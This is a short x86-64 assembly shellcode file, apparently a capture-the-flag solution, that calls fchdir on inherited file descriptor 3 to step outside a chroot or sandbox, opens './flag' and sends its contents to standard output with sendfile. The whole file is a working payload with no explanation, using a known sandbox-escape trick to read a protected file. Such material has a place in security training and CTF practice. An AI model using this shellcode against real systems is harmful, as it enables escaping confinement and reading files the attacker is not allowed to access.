.global _start
_start:
.intel_syntax noprefix

# fchdir(3);
mov rax, 81
mov rdi, 3
syscall

# open("./flag", 0); // 0 is O_RDONLY
mov rax, 2
lea rdi, [rip+flag]
mov rsi, 0
syscall

# sendfile(1, 4, 0, 0x80);
mov rdi, 1
mov rsi, 4
mov rdx, 0
mov r10, 0x80
mov rax, 40
syscall

flag:
.asciz "./flag"
